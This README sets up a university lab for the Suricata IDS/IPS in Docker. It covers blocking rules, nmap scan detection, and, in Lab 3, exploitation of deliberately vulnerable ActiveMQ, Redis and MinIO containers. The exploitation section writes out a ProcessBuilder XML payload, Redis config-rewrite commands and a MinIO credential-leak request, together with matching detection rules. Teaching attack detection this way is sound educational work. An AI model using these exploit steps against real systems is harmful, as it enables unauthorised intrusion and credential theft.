# ITMO Network Security | Suricata IDS/IPS: Docker Lab

This project provides a complete hands-on lab for learning network security with Suricata IDS/IPS, Docker containers, and vulnerability exploitation. It includes three progressive labs covering basic IPS/IDS operations, advanced scan detection, and vulnerable service exploitation.

## Repository Structure

```
ITMO_Suricata-IPS-Docker-Lab/
├── README.md                 # Complete lab guide (this file)
├── docker-compose.yml        # All labs: Complete environment with all services
├── smb.conf                  # Samba configuration
└── setup-suricata.sh         # Automated Suricata installation script
```

## Quick Start (Clean Ubuntu 24.04 VM)

### Prerequisites
- Ubuntu 24.04 LTS (clean installation recommended)
- Docker and Docker Compose installed
- Internet connection for downloading packages and images

### Step 1: Clone Repository
```bash
git clone <repository-url>
cd ITMO_Suricata-IPS-Docker-Lab
```

### Step 2: Install Docker (if not already installed)
```bash
# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo usermod -aG docker $USER

# Install Docker Compose
sudo apt install -y docker-compose-plugin

# Logout and login again, or run:
newgrp docker
```

### Step 3: Automated Suricata Setup
```bash
# Make the setup script executable and run it
chmod +x setup-suricata.sh
./setup-suricata.sh
```

This script will:
- Install Suricata and dependencies
- Configure kernel for Docker bridge filtering
- Set up iptables rules for traffic interception
- Create basic detection rules
- Start Suricata service

### Step 4: Start Lab Environment
```bash
# Start all lab services (includes all labs)
docker compose up -d
```

### Step 5: Verify Setup
```bash
# Check Suricata status
sudo systemctl status suricata

# Check containers
docker compose ps

# View Suricata logs
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type != "flow")'
```


## Lab 1: Basic Suricata IPS/IDS Setup

### Manual Installation (Alternative to setup-suricata.sh)

If you prefer manual installation or need to troubleshoot, follow these steps:

1.  **System Update**
    ```bash
    sudo apt update && sudo apt upgrade -y
    ```

2.  **Installing Dependencies**
    Install necessary utilities, libraries and tools for Suricata operation, iptables management and JSON processing.
    ```bash
    sudo apt install -y software-properties-common curl jq iptables-persistent libnetfilter-queue1 libnfnetlink0
    ```

3.  **Kernel Configuration for Docker Bridge Traffic Filtering**
    Enable bridge traffic filtering (which includes Docker networks) using iptables.
    ```bash
    sudo modprobe br_netfilter
    echo "br_netfilter" | sudo tee /etc/modules-load.d/br_netfilter.conf
    cat << EOF | sudo tee /etc/sysctl.d/99-bridge-nf.conf
    net.bridge.bridge-nf-call-iptables=1
    net.bridge.bridge-nf-call-ip6tables=1
    EOF
    sudo sysctl -p /etc/sysctl.d/99-bridge-nf.conf
    ```

4.  **Installing Suricata from Official PPA Repository**
    Add OISF repository and install Suricata.
    ```bash
    sudo add-apt-repository ppa:oisf/suricata-stable -y
    sudo apt update
    sudo apt install -y suricata
    ```

5.  **Creating and Adding Basic Rules**
    Create custom rules for testing IPS mode (ICMP blocking) and IDS mode (HTTP logging).
    ```bash
    sudo mkdir -p /etc/suricata/rules
    cat << 'EOF' | sudo tee /etc/suricata/rules/local.rules
    # Block all ICMP packets — basic IPS test
    drop icmp any any -> any any (msg:"[IPS] BLOCK ICMP"; sid:1000007; rev:1;)
    # Log HTTP requests — basic IDS test
    alert http any any -> any any (msg:"[IDS] HTTP Request Detected"; sid:100002; rev:1; flow:to_server; classtype:policy-violation;)
    EOF
    ```

6.  **Basic suricata.yaml Configuration**
    Configure the main Suricata configuration file for IPS mode operation with NFQUEUE and activate the created rules.
    *Before making changes, it's recommended to create a backup of the original file:*
    `sudo cp /etc/suricata/suricata.yaml /etc/suricata/suricata.yaml.bak`
    ```bash
    cat << 'EOF' | sudo tee /etc/suricata/suricata.yaml
    %YAML 1.1
    ---
    runmodes:
    - runmode: workers
    # NFQUEUE for IPS
    nfqueue:
      mode: accept
      repeat-mark: 1
      repeat-mask: 1
      bypass-mark: 2
      bypass-mask: 2
      queue-balance:
        - 0-3
    # Rules
    rule-files:
      - /etc/suricata/rules/local.rules
    # EVE — main log
    outputs:
      - eve-log:
          enabled: yes
          filetype: regular
          filename: eve.json
          types:
            - alert
            - drop
            - http
            - dns
    # Disable unnecessary features for simplicity
    classification-file: /etc/suricata/classification.config
    reference-config-file: /etc/suricata/reference.config
    app-layer:
      protocols:
        http: enabled
        dns: enabled
        tls: enabled
    # Logging
    logging:
      outputs:
        - console:
            enabled: no
        - file:
            enabled: yes
            level: info
            filename: suricata.log
    EOF
    ```

7.  **Configuring iptables for Docker Traffic Interception**
    iptables rules direct container traffic to NFQUEUE (queue number 1) for Suricata processing. Uses the `DOCKER-USER` chain, designed for user rules affecting Docker traffic.
    ```bash
    sudo iptables -D DOCKER-USER -j NFQUEUE --queue-num 1 --queue-bypass 2>/dev/null || true
    sudo iptables -I DOCKER-USER -j NFQUEUE --queue-num 1 --queue-bypass
    sudo netfilter-persistent save
    ```

8.  **Setting Permissions and Systemd Service**
    Grant Suricata necessary permissions for network stack operation and create a small override for the Systemd service.
    ```bash
    sudo setcap cap_net_admin,cap_net_raw+ep /usr/bin/suricata
    sudo mkdir -p /etc/systemd/system/suricata.service.d
    cat << 'EOF' | sudo tee /etc/systemd/system/suricata.service.d/override.conf
    [Service]
    ExecStart=
    ExecStart=/usr/bin/suricata -c /etc/suricata/suricata.yaml -q 1 --pidfile /run/suricata.pid
    EOF
    sudo systemctl daemon-reload
    sudo systemctl enable suricata
    sudo systemctl restart suricata
    sudo systemctl status suricata --no-pager
    ```

### Lab 1 Testing Environment

The lab environment includes all services in a single `docker-compose.yml` file. For Lab 1, we'll focus on the basic attacker/victim interaction using the Kali attacker container and vulnerable services.

### Start Lab Environment
```bash
docker compose up -d
```

### Install Tools in Attacker Container
```bash
docker exec attacker apt update && docker exec attacker apt install -y curl iputils-ping
```

### Lab 1: Testing Suricata Operation

1.  **Testing IPS Mode (ICMP Blocking)**
    Execute ping from `attacker` container to vulnerable services:
    ```bash
    docker exec attacker ping -c 4 172.20.0.101
    ```
    *Expected result:* Packets should be lost (100% packet loss). The command won't receive a response as the rule with `drop` action blocks all ICMP traffic.

2.  **Testing IDS Mode (HTTP Logging)**
    Send HTTP request from `attacker` container to vulnerable services:
    ```bash
    docker exec attacker curl -s http://172.20.0.101:8161
    ```
    *Expected result:* The command should execute successfully and return the ActiveMQ web interface, as the HTTP rule is configured only for alerting (`alert`), not blocking.

3.  **Analyzing Suricata Logs**
    To view events in real-time, use `jq` for convenient JSON log formatting of `eve.json`:
    ```bash
    sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type != "flow")'
    ```
    *Expected result:*
    -   When executing ping, events with `event_type: "drop"` and message `"[IPS] BLOCK ICMP"` should appear in the log.
    -   When executing curl, events with `event_type: "alert"` and message `"[IDS] HTTP Request Detected"` should appear in the log, as well as events with `event_type: "http"` containing HTTP request details.

## Lab 2: Advanced Scan Detection and Blocking

### Theory
- **nmap** scan types: SYN `-sS`, Connect `-sT`, UDP `-sU`, XMAS `-sX`, OS fingerprinting `-O`, etc.
- **Suricata** can detect/block scans via signature rules, operate in IPS mode (drop) or IDS (alert), and logs to `eve.json` for investigation.

### Rules: Detection/Blocking of Nmap Scans
The setup script writes these into `/etc/suricata/rules/local.rules` and enables `rule-files` in `suricata.yaml`.

```
# SYN scan (nmap -sS) — block
drop tcp any any -> any any (flags:S; msg:"[IPS] NMAP SYN Scan Blocked"; threshold: type both, track by_src, count 10, seconds 6; sid:1001001; rev:1;)

# XMAS scan (nmap -sX) — alert
alert tcp any any -> any any (flags:FPU; msg:"[IDS] NMAP XMAS Scan Detected"; threshold: type both, track by_src, count 5, seconds 6; sid:1001002; rev:1;)

# UDP scan (nmap -sU) — block
drop udp any any -> any any (msg:"[IPS] NMAP UDP Scan Blocked"; threshold: type both, track by_src, count 10, seconds 10; sid:1001003; rev:1;)

# OS fingerprinting (nmap -O) — alert
alert ip any any -> any any (msg:"[IDS] Possible OS Fingerprinting Attempt"; ipopts: any; threshold: type both, track by_src, count 5, seconds 20; sid:1001101; rev:1;)

# ACK scan (nmap -sA) — alert
alert tcp any any -> any any (flags:A; msg:"[IDS] NMAP ACK Scan Detected"; threshold: type both, track by_src, count 5, seconds 10; sid:1001004; rev:1;)

# FIN scan (nmap -sF) — alert
alert tcp any any -> any any (flags:F; msg:"[IDS] NMAP FIN Scan Detected"; threshold: type both, track by_src, count 3, seconds 10; sid:1001005; rev:1;)

# NULL scan (nmap -sN) — alert
alert tcp any any -> any any (flags:0; msg:"[IDS] NMAP NULL Scan Detected"; threshold: type both, track by_src, count 2, seconds 10; sid:1001006; rev:1;)
```

### Activation
- Rules are written by `setup-suricata.sh`. Suricata is restarted via systemd with NFQUEUE (IPS mode) as in Lab 1.
- Ensure iptables rule routes Docker traffic to NFQUEUE queue number 1 using the `DOCKER-USER` chain (the script does this for you).

### Lab 2: Generate Test Traffic

Install additional tools in attacker container:
```bash
docker exec attacker apt update
docker exec attacker apt install -y nmap iputils-ping curl
```

Run various scan types:
```bash
# SYN scan
docker exec attacker nmap -sS 172.20.0.101

# XMAS scan
docker exec attacker nmap -sX 172.20.0.101

# UDP scan
docker exec attacker nmap -sU 172.20.0.101

# OS fingerprinting
docker exec attacker nmap -O 172.20.0.101
```

### Lab 2: Verify Detection
```bash
# View raw Suricata logs
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type != "flow")'

# Open EveBox UI (if running)
# Navigate to http://localhost:5636 and filter by event_type:alert or event_type:drop
```

Expected results:
- `drop` events for blocked scans (SYN, UDP)
- `alert` events for detected-only techniques (XMAS, OS fingerprinting)

### Lab 2: Rule Strategy
- **Block (`drop`)**: Noisy, clear attack patterns (SYN scans, UDP scans)
- **Alert (`alert`)**: Suspicious but less certain patterns (OS fingerprinting, stealth scans)
- **Tuning**: Adjust `threshold` values or add IP exceptions to reduce false positives

## Lab 3: Vulnerable Services Exploitation and Protection

This lab demonstrates exploitation of intentionally vulnerable services and shows how Suricata can detect and prevent these attacks.

### Lab 3 Environment

**Network**: `vulnnet` (172.20.0.0/16)

**Services**:
- **Kali Attacker**: `172.20.0.10` (container: `attacker`)
- **Apache ActiveMQ 5.16.5** (CVE-2023-46604): `172.20.0.101:61616,8161`
- **Redis 5.0.7** (unauthorized access): `172.20.0.102:6379`
- **MinIO Cluster** (CVE-2023-28432): `172.20.0.103:9000,9001` (node1 exposed)
- **Samba 4.6.3** (CVE-2017-7494): `172.20.0.104:445,6699`
- **Jenkins 2.441** (CVE-2024-23897): `172.20.0.105:8080,50000,5005`
- **EveBox**: `172.20.0.200:5636` (Suricata log visualization)

### Start Lab 3 Environment

```bash
# Start all lab services (includes vulnerable services)
docker compose up -d

# Check all containers are running
docker compose ps

# Access EveBox UI
# Open http://localhost:5636 in your browser
```

### Install Tools in Kali Attacker

```bash
# Enter the attacker container
docker exec -it attacker bash

# Install required tools
apt update
apt install -y vim nmap jq metasploit-framework netcat-traditional telnet \
  smbclient redis-tools python3-pip python3-venv curl wget python3 awscli \
  openssh-client hydra git gcc file openjdk-11-jre
```

### Lab 3: Suricata Protection Rules

Add these rules to `/etc/suricata/rules/local.rules` for Lab 3 protection:

```bash
# ActiveMQ (CVE-2023-46604) - detect OpenWire connections and ProcessBuilder
alert tcp any any -> any 61616 (msg:"[IDS] ActiveMQ OpenWire Connection"; flow:to_server,established; threshold: type limit, track by_src, count 1, seconds 300; sid:3000001; rev:1;)
drop tcp any any -> any 61616 (msg:"[IPS] ActiveMQ ProcessBuilder Exploit Blocked"; flow:to_server,established; content:"ProcessBuilder"; nocase; threshold: type limit, track by_src, count 1, seconds 60; sid:3000002; rev:1;)

# Redis - detect unauthorized access and dangerous operations
alert tcp any any -> any 6379 (msg:"[IDS] Redis Unauthorized Access"; flow:to_server,established; threshold: type limit, track by_src, count 1, seconds 300; sid:3000101; rev:1;)
drop tcp any any -> any 6379 (msg:"[IPS] Redis Config Manipulation Blocked"; flow:to_server,established; content:"config set dir"; nocase; threshold: type limit, track by_src, count 1, seconds 60; sid:3000102; rev:1;)

# MinIO (CVE-2023-28432) - detect bootstrap verify exploitation
drop http any any -> any 9000 (msg:"[IPS] MinIO CVE-2023-28432 Exploitation Blocked"; flow:to_server,established; http_uri; content:"/minio/bootstrap/v1/verify"; http_method; content:"POST"; threshold: type limit, track by_src, count 1, seconds 3600; sid:3000201; rev:1;)

# Samba (CVE-2017-7494) - detect SMB library uploads
alert smb any any -> any 445 (msg:"[IDS] SMB Shared Library Upload"; flow:to_server,established; smb_command:write; filename:".so"; sid:3000301; rev:1;)
drop smb any any -> any 445 (msg:"[IPS] SambaCry Library Upload Blocked"; flow:to_server,established; smb_command:write; filename:"libbindshell-samba.so"; threshold: type limit, track by_src, count 1, seconds 3600; sid:3000302; rev:1;)

# Jenkins (CVE-2024-23897) - detect file read exploitation
drop http any any -> any 8080 (msg:"[IPS] Jenkins File Read Exploitation Blocked"; flow:to_server,established; http_request_body; content:"@/"; threshold: type limit, track by_src, count 1, seconds 3600; sid:3000401; rev:1;)
```

Apply the rules:
```bash
sudo systemctl restart suricata
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type!="flow")'
```

### Lab 3: Exploitation Examples

**ActiveMQ (CVE-2023-46604)**:
```bash
# Fingerprint
nmap -sV -p 61616,8161 172.20.0.101

# Create payload and exploit
echo '<?xml version="1.0"?><beans><bean id="pb" class="java.lang.ProcessBuilder" init-method="start"><constructor-arg><list><value>touch</value><value>/tmp/activemq-pwned</value></list></constructor-arg></bean></beans>' > poc.xml
python3 -m http.server 8080 &
python3 poc.py 172.20.0.101 61616 http://172.20.0.10:8080/poc.xml
```

**Redis (Unauthorized Access)**:
```bash
# Connect and exploit
redis-cli -h 172.20.0.102
config set dir /tmp
config set dbfilename test.rdb
set payload "Redis compromised!"
save
```

**MinIO (CVE-2023-28432)**:
```bash
# Exploit bootstrap endpoint
curl -X POST http://172.20.0.103:9000/minio/bootstrap/v1/verify -d ""

# Use stolen credentials
aws configure set aws_access_key_id minioadmin
aws configure set aws_secret_access_key minioadmin-vulhub
aws --endpoint-url http://172.20.0.103:9000 s3 ls
```

### Lab 3: Monitoring and Analysis

- **EveBox UI**: `http://localhost:5636` - filter by `event_type:alert` or `event_type:drop`
- **Raw Logs**: `sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type!="flow")'`
- **Container Logs**: `docker logs <container-name>` for service-specific logs

## Troubleshooting

### Common Issues

**Suricata not starting**:
```bash
sudo systemctl status suricata
sudo journalctl -u suricata -f
```

**Docker containers not starting**:
```bash
docker compose ps
docker logs <container-name>
```

**EveBox not accessible**:
```bash
# Check if EveBox container is running
docker logs evebox

# Check if Suricata log file exists
sudo ls -la /var/log/suricata/eve.json

# Restart EveBox if needed
docker restart evebox
```

**Platform warnings (amd64 vs arm64)**:
- These are warnings only and shouldn't prevent containers from running
- If containers crash, add `platform: linux/amd64` to each service in docker-compose files

**Samba mount issues**:
```bash
# Ensure smb.conf exists in the same directory as docker-compose.lab3.yml
ls -la smb.conf

# If mount fails, copy config into running container
docker cp smb.conf victim-samba:/etc/samba/smb.conf
docker restart victim-samba
```

### Reset Everything

```bash
# Stop all containers
docker compose down

# Reset Suricata
sudo systemctl stop suricata
sudo iptables -D DOCKER-USER -j NFQUEUE --queue-num 1 --queue-bypass 2>/dev/null || true
sudo systemctl start suricata

# Clean up Docker
docker system prune -f
```

## Summary

This lab provides three progressive learning modules:

1. **Lab 1**: Basic Suricata IPS/IDS setup and testing
2. **Lab 2**: Advanced scan detection and blocking
3. **Lab 3**: Vulnerable service exploitation and protection

Each lab builds upon the previous one, providing hands-on experience with network security, intrusion detection/prevention, and vulnerability exploitation in a controlled environment.

